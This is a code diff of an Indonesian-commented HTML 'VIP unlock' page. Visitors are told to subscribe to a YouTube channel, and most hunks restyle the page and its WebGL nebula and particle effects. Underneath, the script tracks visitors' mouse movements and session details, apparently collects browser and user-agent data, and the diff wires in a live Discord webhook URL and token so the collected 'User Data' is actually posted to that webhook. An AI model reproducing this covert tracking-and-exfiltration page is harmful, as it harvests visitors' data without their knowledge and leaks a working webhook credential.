@@ -14,64 +14,64 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             position: relative;
-            background: #0a1a3a; /* Biru kosmik gelap */
+            background: #0a1a3a;
         }
         #webglCanvas {
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100vw;
+            height: 100vh;
             z-index: 1;
-            opacity: 0.8; /* Nebula WebGL */
+            opacity: 0.9;
         }
         #particleCanvas {
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100vw;
+            height: 100vh;
             z-index: 2;
-            opacity: 0.6; /* Partikel kristal */
+            opacity: 0.7;
         }
         .overlay {
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(30, 64, 175, 0.4), rgba(29, 78, 216, 0.4));
-            z-index: 3; /* Overlay kristal */
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(135deg, rgba(30, 64, 175, 0.3), rgba(29, 78, 216, 0.3));
+            z-index: 3;
         }
         .container {
             background: linear-gradient(145deg, rgba(30, 64, 175, 0.95), rgba(29, 78, 216, 0.95));
-            padding: 60px;
-            border-radius: 30px;
-            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.9), 0 0 40px rgba(37, 99, 235, 0.8);
-            max-width: 900px;
-            width: 95%;
-            border: 5px solid #d4af37; /* Aksen emas */
+            padding: 1.5rem;
+            border-radius: 1rem;
+            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.9), 0 0 1rem rgba(37, 99, 235, 0.8);
+            max-width: 90%;
+            width: 22rem;
+            border: 0.2rem solid #d4af37;
             z-index: 4;
             position: relative;
-            transform: perspective(1200px) rotateX(8deg) rotateY(8deg);
+            transform: perspective(40rem) rotateX(6deg) rotateY(6deg);
             transition: transform 0.5s ease;
         }
         .container:hover {
-            transform: perspective(1200px) rotateX(0deg) rotateY(0deg) scale(1.05);
+            transform: perspective(40rem) rotateX(0deg) rotateY(0deg) scale(1.05);
         }
         @keyframes float {
-            0%, 100% { transform: perspective(1200px) rotateX(8deg) rotateY(8deg) translateY(0); }
-            50% { transform: perspective(1200px) rotateX(8deg) rotateY(8deg) translateY(-15px); }
+            0%, 100% { transform: perspective(40rem) rotateX(6deg) rotateY(6deg) translateY(0); }
+            50% { transform: perspective(40rem) rotateX(6deg) rotateY(6deg) translateY(-0.5rem); }
         }
         .emblem {
             position: absolute;
-            top: -100px;
+            top: -3rem;
             left: 50%;
             transform: translateX(-50%);
-            width: 120px;
-            height: 120px;
+            width: 4rem;
+            height: 4rem;
             animation: spinEmblem 6s infinite linear, glowEmblem 2s infinite ease-in-out;
         }
         @keyframes spinEmblem {
@@ -79,44 +79,45 @@
             to { transform: translateX(-50%) rotateY(360deg); }
         }
         @keyframes glowEmblem {
-            0%, 100% { filter: drop-shadow(0 0 15px #d4af37); }
-            50% { filter: drop-shadow(0 0 30px #d4af37); }
+            0%, 100% { filter: drop-shadow(0 0 0.5rem #d4af37); }
+            50% { filter: drop-shadow(0 0 1rem #d4af37); }
         }
         h1 {
-            font-size: 48px;
-            margin-bottom: 40px;
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
             text-transform: uppercase;
-            letter-spacing: 6px;
+            letter-spacing: 0.2rem;
             color: #f3e8ff;
-            text-shadow: 0 0 20px rgba(147, 197, 253, 0.9), 0 0 30px rgba(212, 175, 55, 0.5);
+            text-shadow: 0 0 0.8rem rgba(147, 197, 253, 0.9), 0 0 1rem rgba(212, 175, 55, 0.5);
             position: relative;
             animation: glitch 2s infinite;
         }
         @keyframes glitch {
             0% { transform: translate(0); opacity: 1; }
-            2% { transform: translate(2px, -2px); opacity: 0.8; }
-            4% { transform: translate(-2px, 2px); opacity: 0.9; }
+            2% { transform: translate(0.1rem, -0.1rem); opacity: 0.8; }
+            4% { transform: translate(-0.1rem, 0.1rem); opacity: 0.9; }
             6% { transform: translate(0); opacity: 1; }
         }
         p {
             font-family: 'Roboto', sans-serif;
-            font-size: 22px;
+            font-size: 0.9rem;
             color: #e5e7eb;
+            margin: 0.5rem 0;
         }
         button {
             background: linear-gradient(90deg, #1e40af, #2563eb);
             color: #ffffff;
-            border: 4px solid #d4af37;
-            padding: 20px 40px;
-            margin: 25px;
-            border-radius: 15px;
+            border: 0.15rem solid #d4af37;
+            padding: 0.8rem 1.5rem;
+            margin: 0.5rem;
+            border-radius: 0.5rem;
             cursor: pointer;
-            font-size: 24px;
+            font-size: 1rem;
             font-weight: bold;
             font-family: 'Playfair Display', serif;
             position: relative;
             overflow: hidden;
-            transform: perspective(600px) rotateX(12deg);
+            transform: perspective(20rem) rotateX(10deg);
             transition: all 0.4s ease;
         }
         button::after {
@@ -139,39 +140,47 @@
             background: #4b5563;
             border-color: #4b5563;
             cursor: not-allowed;
-            transform: perspective(600px) rotateX(0deg);
+            transform: perspective(20rem) rotateX(0deg);
         }
         button:hover:not(:disabled) {
             background: linear-gradient(90deg, #1d4ed8, #3b82f6);
-            transform: perspective(600px) rotateX(0deg) scale(1.1);
-            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.9);
+            transform: perspective(20rem) rotateX(0deg) scale(1.1);
+            box-shadow: 0 0.3rem 0.8rem rgba(59, 130, 246, 0.9);
         }
         #premiumContent, #note, #expire {
             display: none;
-            margin-top: 40px;
+            margin-top: 1rem;
             color: #e5e7eb;
             font-family: 'Roboto', sans-serif;
-            opacity: 0; /* Awalnya transparan */
-            transition: opacity 3s ease; /* Transisi muncul 3 detik */
+            opacity: 0;
+            transition: opacity 3s ease;
+            text-align: center;
         }
         #premiumContent.active, #note.active, #expire.active {
             display: block;
-            opacity: 1; /* Menjadi solid saat aktif */
+            opacity: 1;
         }
         #premiumContent h2 {
             animation: typeWriter 3s steps(40) forwards;
             white-space: nowrap;
             overflow: hidden;
-            border-right: 3px solid #d4af37;
+            border-right: 0.1rem solid #d4af37;
+            font-size: 1.2rem;
+            margin: 0 0 0.8rem 0;
         }
         @keyframes typeWriter {
             from { width: 0; }
             to { width: 100%; }
         }
         #note, #expire {
-            font-size: 20px;
+            font-size: 0.9rem;
             color: #bfdbfe;
-            text-shadow: 0 0 10px rgba(191, 219, 254, 0.7);
+            text-shadow: 0 0 0.4rem rgba(191, 219, 254, 0.7);
+            margin: 0.4rem 0;
+        }
+        #premiumContent p {
+            font-size: 0.9rem;
+            margin: 0.4rem 0;
         }
         a {
             color: #f3e8ff;
@@ -183,16 +192,89 @@
         }
         .diamond-icon {
             display: inline-block;
-            width: 30px;
-            height: 30px;
+            width: 1.2rem;
+            height: 1.2rem;
             background: url('https://img.icons8.com/ios-filled/50/d4af37/diamond.png') no-repeat center;
             background-size: contain;
-            margin: 0 10px;
+            margin: 0 0.3rem;
             animation: spinDiamond 3s infinite linear;
         }
         @keyframes spinDiamond {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
+        }
+
+        /* Media Queries untuk Responsivitas */
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+                width: 85%;
+                max-width: 18rem;
+                transform: perspective(30rem) rotateX(4deg) rotateY(4deg);
+            }
+            h1 {
+                font-size: 1.5rem;
+                margin-bottom: 1rem;
+                letter-spacing: 0.15rem;
+            }
+            p {
+                font-size: 0.8rem;
+            }
+            button {
+                padding: 0.6rem 1.2rem;
+                font-size: 0.9rem;
+                margin: 0.3rem;
+            }
+            .emblem {
+                top: -2.5rem;
+                width: 3.5rem;
+                height: 3.5rem;
+            }
+            #premiumContent h2 {
+                font-size: 1rem;
+            }
+            #premiumContent p {
+                font-size: 0.8rem;
+            }
+            #note, #expire {
+                font-size: 0.8rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 0.5rem;
+                width: 90%;
+                max-width: 16rem;
+                transform: perspective(20rem) rotateX(2deg) rotateY(2deg);
+            }
+            h1 {
+                font-size: 1.2rem;
+                margin-bottom: 0.8rem;
+                letter-spacing: 0.1rem;
+            }
+            p {
+                font-size: 0.7rem;
+            }
+            button {
+                padding: 0.5rem 1rem;
+                font-size: 0.8rem;
+                margin: 0.2rem;
+            }
+            .emblem {
+                top: -2rem;
+                width: 3rem;
+                height: 3rem;
+            }
+            #premiumContent h2 {
+                font-size: 0.9rem;
+            }
+            #premiumContent p {
+                font-size: 0.7rem;
+            }
+            #note, #expire {
+                font-size: 0.7rem;
+            }
         }
     </style>
 </head>
@@ -211,7 +293,6 @@
         <p>Step 1: Subscribe To Our Channel For Unlock Access</p>
         <p>Step 2: Don't UnSubscribe Or I Will Delete Your Whitelist User:D</p>
         <p>Step 3: Just Enjoy it And Don't Be A Bully And Hater</p>
-        <p>Step 4: Click Desktop Site In Your Browser For Like Pc</p>
         <a href="https://youtube.com/@themugenking?si=xHcLhvJnGXWcE_ZG" target="_blank" id="subscribeLink">
             <button id="subscribeBtn">Subscribe <span class="diamond-icon"></span></button>
         </a>
@@ -232,7 +313,7 @@
     <script src="https://unpkg.com/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
     <script>
-        // WebGL Nebula Background
+        // WebGL Nebula Background (Enhanced)
         const webglCanvas = document.getElementById('webglCanvas');
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -240,7 +321,7 @@
         renderer.setSize(window.innerWidth, window.innerHeight);
         camera.position.z = 5;
 
-        const geometry = new THREE.SphereGeometry(5, 32, 32);
+        const geometry = new THREE.PlaneGeometry(10, 10, 32, 32);
         const material = new THREE.ShaderMaterial({
             uniforms: {
                 time: { value: 0 },
@@ -257,11 +338,17 @@
                 uniform float time;
                 uniform vec2 resolution;
                 varying vec2 vUv;
+
                 void main() {
                     vec2 uv = vUv;
-                    float nebula = sin(uv.x * 10.0 + time) * cos(uv.y * 10.0 + time) * 0.5 + 0.5;
-                    vec3 color = vec3(0.1, 0.3, 0.7) * nebula + vec3(0.05, 0.1, 0.2);
-                    gl_FragColor = vec4(color, 0.8);
+                    vec2 p = uv * 8.0 - vec2(4.0);
+                    float d = length(p);
+                    float a = atan(p.y, p.x);
+                    float r = sin(time * 0.2 + a * 3.0 + sin(time * 0.1 + a * 4.0)) * 0.5 + 0.5;
+                    float nebula = sin(d * 2.0 + time * 0.3) * r * 0.5 + 0.5;
+                    vec3 color = vec3(0.1, 0.4, 0.8) * nebula + vec3(0.9, 0.6, 0.2) * r * 0.3;
+                    color += vec3(0.8, 0.2, 0.4) * sin(time + uv.x * 10.0) * 0.1;
+                    gl_FragColor = vec4(color, 0.9);
                 }
             `
         });
@@ -270,13 +357,13 @@
 
         function animateWebGL() {
             requestAnimationFrame(animateWebGL);
-            material.uniforms.time.value += 0.01;
-            mesh.rotation.y += 0.005;
+            material.uniforms.time.value += 0.02;
+            mesh.rotation.z += 0.001;
             renderer.render(scene, camera);
         }
         animateWebGL();
 
-        // Interactive Crystal Particles
+        // Interactive Crystal Particles (Enhanced)
         const particleCanvas = document.getElementById('particleCanvas');
         const ctx = particleCanvas.getContext('2d');
         particleCanvas.width = window.innerWidth;
@@ -289,52 +376,58 @@
             constructor() {
                 this.x = Math.random() * particleCanvas.width;
                 this.y = Math.random() * particleCanvas.height;
-                this.size = Math.random() * 3 + 2;
-                this.speedX = Math.random() * 0.5 - 0.25;
-                this.speedY = Math.random() * 0.5 - 0.25;
-                this.color = `hsl(${Math.random() * 60 + 180}, 70%, 70%)`;
+                this.size = Math.random() * 4 + 2;
+                this.speedX = Math.random() * 1 - 0.5;
+                this.speedY = Math.random() * 1 - 0.5;
+                this.hue = Math.random() * 360;
+                this.alpha = Math.random() * 0.8 + 0.2;
             }
             update() {
                 if (mouse.x && mouse.y) {
                     let dx = mouse.x - this.x;
                     let dy = mouse.y - this.y;
                     let distance = Math.sqrt(dx * dx + dy * dy);
-                    if (distance < 150) {
-                        this.speedX += dx / distance * 0.5;
-                        this.speedY += dy / distance * 0.5;
-                        this.size = Math.min(this.size + 0.1, 5);
+                    if (distance < 200) {
+                        this.speedX += dx / distance * 0.3;
+                        this.speedY += dy / distance * 0.3;
+                        this.size = Math.min(this.size + 0.2, 6);
+                        this.alpha = Math.min(this.alpha + 0.1, 0.9);
                     }
                 }
                 this.x += this.speedX;
                 this.y += this.speedY;
-                if (this.size > 0.2) this.size -= 0.01;
-                if (this.x < 0 || this.x > particleCanvas.width) this.speedX *= -1;
-                if (this.y < 0 || this.y > particleCanvas.height) this.speedY *= -1;
+                if (this.size > 0.5) this.size -= 0.02;
+                if (this.alpha > 0.2) this.alpha -= 0.005;
+                if (this.x < 0 || this.x > particleCanvas.width) this.speedX *= -0.9;
+                if (this.y < 0 || this.y > particleCanvas.height) this.speedY *= -0.9;
             }
             draw() {
-                ctx.fillStyle = this.color;
+                ctx.fillStyle = `hsla(${this.hue}, 70%, 60%, ${this.alpha})`;
                 ctx.beginPath();
                 ctx.moveTo(this.x, this.y - this.size);
-                ctx.lineTo(this.x + this.size, this.y + this.size);
-                ctx.lineTo(this.x - this.size, this.y + this.size);
+                ctx.lineTo(this.x + this.size * 0.7, this.y + this.size * 0.7);
+                ctx.lineTo(this.x - this.size * 0.7, this.y + this.size * 0.7);
                 ctx.closePath();
                 ctx.fill();
+                ctx.strokeStyle = `hsla(${this.hue + 30}, 70%, 80%, ${this.alpha * 0.5})`;
+                ctx.lineWidth = 0.5;
+                ctx.stroke();
             }
         }
 
         function initParticles() {
-            for (let i = 0; i < 40; i++) {
+            for (let i = 0; i < 60; i++) {
                 particles.push(new Particle());
             }
         }
 
         function animateParticles() {
             ctx.clearRect(0, 0, particleCanvas.width, particleCanvas.height);
-            particles.forEach(p => {
+            particles.forEach((p, index) => {
                 p.update();
                 p.draw();
-                if (p.size <= 0.2) {
-                    particles.splice(particles.indexOf(p), 1);
+                if (p.size <= 0.5 || p.alpha <= 0.2) {
+                    particles.splice(index, 1);
                     particles.push(new Particle());
                 }
             });
@@ -354,22 +447,22 @@
             const container = document.getElementById('mainContainer');
             const x = (e.clientX / window.innerWidth - 0.5) * 20;
             const y = (e.clientY / window.innerHeight - 0.5) * 20;
-            container.style.transform = `perspective(1200px) rotateX(${y}deg) rotateY(${x}deg)`;
+            container.style.transform = `perspective(40rem) rotateX(${y}deg) rotateY(${x}deg)`;
         });
 
         // Sound Effects
         function playClickSound() {
-            const audio = new Audio(''); // Ganti dengan suara kristal
+            const audio = new Audio('');
             audio.play().catch(e => console.log('Audio play failed:', e));
         }
 
         function playHoverSound() {
-            const audio = new Audio(''); // Ganti dengan suara hover futuristik
+            const audio = new Audio('');
             audio.play().catch(e => console.log('Audio play failed:', e));
         }
 
         function playAmbientSound() {
-            const audio = new Audio('https://www.soundjay.com/ambient/ambient-space-drone-01.mp3'); // Ganti dengan suara ambien kosmik
+            const audio = new Audio('https://www.soundjay.com/ambient/ambient-space-drone-01.mp3');
             audio.loop = true;
             audio.volume = 0.3;
             audio.play().catch(e => console.log('Audio play failed:', e));
@@ -378,7 +471,7 @@
         window.addEventListener('load', playAmbientSound);
 
         // Initialize variables
-        const webhookURL = 'https://discord.com/api/webhooks/1382185335295053935/2pidOjXDJDCi1zQdBZlSLeiur14IHiNZky2VMVWI5_rbbSoSO-F_lVzM2ZDbsWHCV0py';
+        const webhookURL = 'https://discord.com/api/webhooks/1382290023973388378/vSVbYXSAImbRXclo5CcigWHeHzxHl2f8LXXUluyNl6GDmZipJxv85ZmBy3E2Y_mCoeng';
         let mouseMovements = [];
         let sessionStartTime = performance.now();
         const sessionId = Math.random().toString(36).substring(2, 15);
@@ -404,7 +497,7 @@
 
         // Mouse movement tracking
         document.addEventListener('mousemove', (e) => {
-            mouseMovements.push({ x: e.clientX, y: e.clientY, time: new Date().toLocaleTimeString() });
+            mouseMovements.push({ x: e.clientX, y: e.clientY, time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }) });
             if (mouseMovements.length > 10) mouseMovements.shift();
             interactionCount++;
         });
@@ -509,13 +602,13 @@
 
         // Send data to Discord webhook
         async function sendToDiscord(data) {
-            if (!webhookURL || webhookURL === 'https://discord.com/api/webhooks/1382290023973388378/vSVbYXSAImbRXclo5CcigWHeHzxHl2f8LXXUluyNl6GDmZipJxv85ZmBy3E2Y_mCoeng') {
+            if (!webhookURL || webhookURL === 'YOUR_DISCORD_WEBHOOK_URL') {
                 console.error('Invalid webhook URL');
                 return;
             }
 
             const embed = {
-                title: 'User Data',
+                title: 'Hyper Cosmic Ultra Elite VIP User Data',
                 fields: Object.entries(data).map(([name, value]) => ({
                     name: name.charAt(0).toUpperCase() + name.slice(1),
                     value: value.toString().substring(0, 1024),
@@ -542,7 +635,7 @@
         // Handle Continue button click
         continueBtn.addEventListener('click', async () => {
             if (!hasSubscribed) {
-                return; // Tidak ada tindakan jika belum subscribe
+                return;
             }
 
             const data = await collectData();
